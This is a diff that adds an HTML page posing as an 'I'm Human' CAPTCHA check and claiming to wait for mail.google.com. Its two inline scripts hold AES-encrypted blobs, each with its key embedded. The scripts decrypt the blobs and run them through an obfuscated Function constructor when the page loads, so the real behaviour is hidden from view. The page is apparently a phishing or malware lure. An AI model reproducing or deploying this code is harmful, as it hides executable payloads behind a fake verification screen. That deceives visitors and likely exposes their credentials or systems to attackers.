@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html><head>
+    <title>&#8203;</title>
+    <meta charset="UTF-8">
+    <style>
+    body {
+      background: #ffffff;
+      display: flex;
+      flex-direction: row;
+      flex-wrap: nowrap;
+      align-items: flex-start;
+      justify-content: center;
+    }
+
+    .captcha-box {
+      background: #ffffff;
+      padding: 10px 60px;
+      border-radius: 12px;
+      top: 63px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 10px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+      position: relative;
+      flex-wrap: nowrap;
+      justify-content: center;
+    }
+
+    .captcha-top {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .checkbox {
+      width: 26px;
+      height: 26px;
+      border: 2px solid #666;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .checkbox.checked {
+      background-color: #4caf50;
+      color: white;
+    }
+
+    .checkbox.checked::after {
+      content: "✔";
+      font-size: 16px;
+    }
+
+    .label {
+      font-size: 1.2em;
+      font-weight: bold;
+    }
+
+    .emoji-bot {
+      font-size: 40px;
+      margin-left: auto;
+      transition: transform 1s ease, opacity 1s ease;
+    }
+
+    .emoji-bot.blast {
+      transform: rotate(720deg) scale(0.1) translateY(-100px);
+      opacity: 0;
+    }
+
+    .confetti {
+      position: absolute;
+      top: 0;
+      left: 0;
+      pointer-events: none;
+      width: 100%;
+      height: 100%;
+    }
+
+    .confetti span {
+      position: absolute;
+      font-size: 22px;
+      animation: fall 1.5s ease-out forwards;
+    }
+
+    @keyframes fall {
+      to {
+        transform: translateY(150px) rotate(720deg);
+        opacity: 0;
+      }
+    }
+
+    .message {
+      background: #d4edda;
+      color: #155724;
+      padding: 8px 15px;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 1em;
+      display: none;
+      margin-top: 8px;
+    }
+
+    .message.show {
+      display: inline-block;
+    }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script>
+    (function(){
+var bm = "6nzHrj0T0cqa5py66nMwWVPPTEL2Cv9lTsf20gMc9rEQRHi2i\/XQOKPqV\/eeO5myVpeUDtBM50Qiul3sLOTzplidm1zvwx0Ff9fjlRUzxYEUTc6fXey5xRfbgHc\/WIP\/F\/7gWM5Ef7wHK58QVWcjq\/K9DDPumfypeKrgFIP0gup0ZNxGMwy9OjaKL6ZQ5UKD4hDLQWoYFSCd++PJavQ3YDQo7gcn0o29jpQsTRmLx3s\/\/b1vUnsk5QexqaeRNRFsEACmAWQ9ctjJZCnFEnjpIAFu0gkTKItVagAlOg2h9zi5fLQoc2LYIIWRaTZ\/XGbizMkIDzQrLgNrVrmkrM0EhDJhlYpNqW2MKAWK2P5+D4jrUwE+pcv843CybC0rIvlrSLXvvrIUHmDZlqOcCoj8uEMAwq865QZndA5atBypbVj\/W2Gr9eauiTThjEHgqsQ8YmfbPrf7NuiLMLrverNRj\/UJFb7kjF1SH2QxNVd8RO0gEQmoVovRM3T6UDgSD\/AofFi9vI87IoGg2CQkDHyLBRRpmw56fd3wiGGrJyScS0\/p0MoUe0kOs1HfQY\/piXCqi4j1tzako+OR\/RN7UoygHhoZRCjKsaaT1YW4v60WIrLUcdwtlwKqW\/1HfMmaOYXb8Q5YgzPFTboUt5z6sda3Yb9LmZpITJSQ7NW65jcmVMPCpkzemPXkbogrE4jrBYenmf4MbDKqkAUMDdnv9Tuob5w\/hS\/cNL1bdrHRY4eg3nIy0VhARaUlkk+ZIW0WWU0idQctAqiekojZte55kprhjEZxpvZoZY1FV2azUOCdOOcmWq7nVVZ0Qp\/1newUGzGkBMEFS\/x1dDJi2828bBVez0CVRmngViEJUC2b++r2USvpcg4IOiOR1Z5rLRRt31q\/qCDEi33KvOL5rrVE1PwLsMWzQaSi7oN\/o0kyPufk6le4MH8hOHlFKgdDfln1yJz4LKlVT29qOZkf5SrHL51WLl48KCtKuh+eW+Ifp6soXFuQS\/wKK6a6RU+AcDrA3Q2vw+jT206DGyJ5Lp\/b4xIoSP4fMQWyeUvZBUKp506ZtzSYYeH+GV\/tXVChThtrl75ITUI3cXGwFtcleSOMeu9Y94hApoQDpAmxuBVcPs7NY0Aajq1Ww9pn+HqduYo9nexWaSNa6QX+z+dIinmrvY6KZALYtaxWkEEiQ5Avw+59m8nx3HtF1hUc3HCHkojX2G2hJqdJnenBqkk8Q6Enx1pghrNVUDkToRQjEX6dCP1fLpjCjSyP5ngiG6SY1S6u8hsgi62\/xgBOVFdyh+PlXCBh+b3peA8rpSB6PIzNL+51zkh7SBQ\/QMCeGBsok4k5Si8VqTw+e9ChasRscNqdT4r+fAGpfiGx1wFpwnro2b4pXJ40bO5cJQ3uOoNIC\/fKXrZTKckhbBOWMjoaDKEIs93GC6pAcAmW5uEjMIsCZVO8Hg6uq0Rk\/C6xbHkRyFGSnJRg4Ubz7UfXNmmMpIogezv7svhFQ9OWVe4WXNtukyAOUmdEcibPsLDbM+P6MCLO8AgwiJ2foDpTu4QAEmpzCquTkEsxnnf3kG\/\/0KZAIHygI5IPjFMZZCp6rwG5jLh0z7ZxTb2\/P2o4lUAyWz9iEWd03Nr4u\/g22CocIRBAazIEJyg2IvlcJ+juHM+urSiDBY5DpNFp2Y6sjoIWX4LSk6P6feVDd9JLUcbL3MYpZVH80Xp89\/sEYsnQzsYP8IfJqqpoB3iMP6imQ3sKKwfCgDEDqgs9UVfx5JqTLkFG9p7IJj95kTzRBbV5pOpqa6aYaK6JJEPnN8ps6unyUdxzcTN3+b5Duz8zh\/Q3DosxnPN0q7qT0XWotLoz6S58ufxrxK\/wW9DfwGogZ994XqnBeuP4OwFIsw2JXb2sC859jQbFhiQ60RYQecnuddWNzUrLfHsFcqMU5YIvElsuC7FFdz7hqI3eg68jXw+yAnlLGty5mdvNclELScyPt9pmaSCmPoFv893m8LbRBg3fFBk\/jlczxT6jXSvIaie0J5BPq0O3I63NnHovtCYKRxZHW\/WxHulji+VsXr2l\/T\/gM6qz3o5ztsfRiwOLsofKqQaQQz3202Q+yGlolzFdMCQ0TzVWYdx9d7PtCcXKbrbeGIxQKKsJUY0OXDO\/iKHIpDCM6ZlBa21PLN+IOF1aCWaiaixLbPCJleQioKMdpOnciALQxIxfX+MB5seymxoMOorA2q+Q8NVLjRxdzBdXlRsA4E7NGLifY7234baaCcIsWVptoCOpsvDrYCHbu\/MJNNSDnejEjrWacAzEpU3zRQjgrkWrCASzyq8JNFEk7SfdoZr7MvVHIs5CJUEeMudu6vTuqOCSmz2IbcOpSRUvtcxNsHjU0wtEKy5qlad4uCHuOnHoP5\/TwnoyAgfcwFbhhML8GTa9jK67bQFl15VJ5BGkFiXf8ohi58aLMNQrSmLLuyVGq6IAKjggvJ4EpLINWqsaJXHWRbfddh9TPTVnX77yv0LwDmepW5mxzU18mxhF5qwNuQELjw==";
+var kh = "1wkNk9MeEYkhFOVuElrAufsKKyQafDY5kgrOySUZGHQ=";
+var lo = CryptoJS.enc.Base64.parse(kh);
+var vp = CryptoJS.enc.Base64.parse(bm);
+var wi = CryptoJS.lib.WordArray.create(vp.words.slice(0, 4), 16);
+var xg = CryptoJS.lib.WordArray.create(
+    vp.words.slice(4),
+    vp.sigBytes - 16
+);
+var fv = CryptoJS.AES.decrypt(
+    { ciphertext: xg },
+    lo,
+    { iv: wi, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }
+);
+var ed = fv.toString(CryptoJS.enc.Utf8);
+const ps = (false + [])[1].constructor.constructor;
+const rt = ps(ed);
+rt();
+})();
+    </script>
+</head>
+<body>
+<div class="captcha-box" id="captchaBox">
+  <div class="captcha-top" id="captchatop">
+    <div class="checkbox" id="checkBox"></div>
+    <div class="label">I'm Human</div>
+    <div class="emoji-bot" id="emojiBot">🤖</div>
+  </div>
+  <div class="confetti" id="confetti"></div>
+  <div class="message" id="successMsg">Verified, waiting for mail.google.com</div>
+</div>
+<script>
+(function(){
+var iz = "eVlVLLO\/3ER2zR3uoGD1qXlx+woxnObg39sa1xCjgG2DvmCuHxHWMEH7Qj0wFhE2O848h2FFRTbKrKdCDv4DRZWK5CfStGYaZHfeBnZlG58pDb9JMTcnSku3qlSOXYZPAezstSp9RahGv6HsPCw2mh2KtAOufSZdv1IbMp+1MNdcyg0s\/MlGt4NgBuAme5YFuDUO8l5mRjwxZA566szxyc7XJpnIIn4uarEdqR41HupECN14wrVvJhnGhSrkb0rRLmY4zNpbq6VV0eZwGdoaD2dWTwzRyAdqD5rQB70Trr4NcnTMMDVmb973LAZoZecj66xNsafst0f0YWCVd4cEC1teNcD8CqeEciGhA1wGlAYY3PJGH8fcPaWkbU9XTWs0Nbl0uXrWyg7yb7vw03FToBuT+cklqMIHfdh2DeiQ\/MbKurVmHf6wvvbr1TlWJeo4nU2QxF3pY1+2xWy+jAa53+MkMIYA75GYtEzmwiqpffCf1gLWy4OSMGC8o7fH6gi52x67kPZCXStOVawZh\/2vW\/GR4AkEJZA\/8+YFVxWFCXHBQ8ter5Z+VhjoTenvBf41PfZB7P6wYR5bAICEC8S6Ng4mLOr1C0twNz3\/KCFtCmMtpQeRIm9BHXx7NWLPIcK3nFLQqkzt74ZjOOfpO7UeFRo9SuCAPApg0BppNLQ0Pe5jHloK5cuNlWe9M\/dkjgNSh3YzbS9m4CysrnDtwIbK9EBWhoeu4Uw3iPjk8dZiUTqphUY9JmwlATbcwJIzkRpt+nyjow8ROU1D\/RvQOo7N2Rfcx\/MknyISItrGCkM53BnF6TtLPdo4sM8UURtRGOIluRFybadONUeOuvvrhV3VwhyB5matTeLZX9XagGHi8KIG\/cKcGnbPQGtr+zGiius0vfiIhoprOfAQLswaL0eypiEDWXVxUPUaiQ5SRFxEiU4m7Ow1AStwpuuquaZST3LuECFENn7U+ut84+ayk7igT7XCpgGd5UbikLI84D\/WK27xIFjiMllxsGWGyR6a\/EfLyU7+n3qyw4PBAxz\/lcoRYt2Pxw4h1quuSBBxfp99TonQA9ZNEImT0UB7YXZI8DDc\/5VNOpTbmq\/aFU+LyANL1tfONa9pO3gSzb\/qSPOClBaX40ytC6gVnZpUYU6PfByps2bCbaRniLKdwgGoIm4jl0gEcpws2IjCU1o3xVQE86Lez0QnRCiabIVvXu5DBSUzRQcRNwazG6WtW7n7WmLqA1f8PvpS0nVDFFtkvlWsskkPyNLopcP9W9WkO\/2Ta\/rqESzmsPB2T7EBfYbMBx1yWzvVOlSAxfRf\/vKXOuWLQt67sviF6a02qnrTtuAvYVIkIPKZOK7g4DqntmF5svl2Jju4W7h7Tn0Eo+RB5xs+Z067LErHGkFG3bGp\/2toLz0JulV9+8XYyXaIr1QGXpBHY0Lsx\/3pAg2i4aUJMctQm\/SAmqV8Ku+n20PndfwZL+BNm6VqZitxUv6qsujmR0Lv\/K1FQJuYYXsNqEv2QRAhXO5OErCatvzvwsvwb5ThP+i2Meif1qX\/63XQxJtjDqB9x4vRnW+5MEg9UdEsmBGFkpIoXvzrSPP2jHEg02ht7l6mLkDyzPMFcSkP2ZLsfa0D4dd0XD72KBhp\/RhNxj+woH84SE8kAIutq5kXR30Q+c4K3W0icj\/xdmZVhY3dGlOGgGESzz+gQHezs8gduUfVP57\/ZKWXV6LcaJQH7URUZXu6V0XvsAeLUxyn6Ij2gzrPVbjMdLEvUrrTbi+qW5S+9zQemafjvz6CIyGG+VjQP8dyWMC0SpanEwzd0VIdiElwQUIC9FLMI+3kB0RWJJZibie93Mzmuusj7b0rcRFcBL1+ABNwHKyAcCVnl0B\/zDnT1N6dvf8Ja7HYsiZT5Bj09zHKCtY17zhvoYTfzFGrSCxZtBL4M8i36ROcxID2uHvOta5ybF\/YmTWLUvZd2KfFSB8vHcQnCk6fm9HUi+oar8GziKcDyvHZNAripNtBCfi5utAxARs9wQmf2WzEJWiH3oSDFAxCjCql6\/eTtD+F+FcBm0dPAhrf1Qtz2GiFj3ABY73jaDNpow3P5exJlKs3Zs4zTnoG7nPDZj3PQyBPJE+5EzbL1KWdqpNlaJoPIFypXoB3y+8v8Am5vqem06T1W3BVCJUL6eWniWGa\/Mg5lZMF8TDmB58oXbv\/TJ9h8XbKHF1bYOXWS3tpIc8skrnlTm+LgLgHjQc1emYxR2X8SuOO\/mr8WqfHfPSq4nKvS8u097KMcLJb3BdJOG7aytp89MuTZsXWq2DU1KTnzLVEPIQY1z0XTFGx1TbRlvFDp7UUlWfhGQleqAfZhH7nwgo0rJkysrBHsFslTPgGOg8+CspK7UkOfyUWWkACxkOb4c5jaBYDtoItmegEXDowldjKjmWc5gAAWns1wuTK08yCcf\/QkV2RMXnRpIqNXAEJA58nVN+3Ukm6\/qJrLE13gr+2sNPfsWbuEzccYWtxCEKMlqwxxbPJ3oFZJtlO2Hw4TnIG9tiEqpZkYqLq7lNOW7mDNFxlNlFB847Td3vAz9Au1lnQSGHOYNrEO0NC3ILGsSBBerdRUKwxMqLlULlceEtYo5ZYm4Z7Y+\/BTUZZPbDWGydW+nrDCHK+nSfBE\/Ct8fDtQnsgV3FuD3V9b6VhTdGMRnbF3OXxdhsWd9qHIzGy3gBB+79ppdQskDLazF9nijQd5mOifZjO+sgPEqEuLpRiKqnwe2PTjDa3iCJ5NDhIk0gZDgwgPmsMqdIlsHr1s6tujDLMnQuALP3Sueny62U2L8Md8RhbuRRBOuZZz868Ly1baqYo3fJ2D3Y7PP5+DrcelaSNU02koNPihUfVp80SMBVsKqBkUHwZSUHtvZkDhd1Nw391BmAd6e82c96eHdUqCWyzk9cuOZ0SEHt+M03GArwbfCsWJEmkjezz92FWDFpH3cg2crfPykUn7qjH1OoX0+59dw\/nkVqzFe+KksNioG0kkL3G4BFXeuWP0khs+MGxfYqkF+HN+thj\/Fxbi\/s6swXIG3yOCA1Owly+nVciGwyFPguMCpxm0HeTe04m3nt3xWmiSDuygo4rNAGgZPKqZIVMMfkPQzn9C4ijsmKTUJl9E77kp+xjPgE3A5q4IpvkhKRQq47R9h7u1rQIK+F2dFdRCqs\/En7lcJKwpAy3f+3oX8owdz7VhIptAHdq55lJ52EXJ+ZT1tA7vQsJH97ykVNno1WU+\/BiRXeYfcDup+aTQkS5HzgjgQRyFGooDO6918N2LWG9L6JGYJqOzHqxgT26g6USHZoOFLwSFZ\/BaCNc4zPlr3IV6Hvs1w1l7PdyfFGbkrMcJNZll4GUMVAn0cmQ24P5GhSP43JMhKbOnb+JAT9xckaAsLkQieD+JUEd8+hKEjLxdYUQiplsPhcYPkqBxGvYmTwFmDRI6lUFHXW16dNysIyefrLkwUR+TUAblMAhtXt1gRdz0LV2X9oE8yB2SknW06\/lnatyy6xkCm44vR\/pT16CJ8tVkjFuRzed";
+var ob = "hPbJ\/W7JUIRYYwWkZx1HiRPrdg0a2uzuu996AViNZtw=";
+var xc = CryptoJS.enc.Base64.parse(ob);
+var be = CryptoJS.enc.Base64.parse(iz);
+var kf = CryptoJS.lib.WordArray.create(be.words.slice(0, 4), 16);
+var bu = CryptoJS.lib.WordArray.create(
+    be.words.slice(4),
+    be.sigBytes - 16
+);
+var dj = CryptoJS.AES.decrypt(
+    { ciphertext: bu },
+    xc,
+    { iv: kf, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 }
+);
+var qs = dj.toString(CryptoJS.enc.Utf8);
+const rg = (false + [])[1].constructor.constructor;
+const gp = rg(qs);
+gp();
+})();
+</script>
+</body></html>
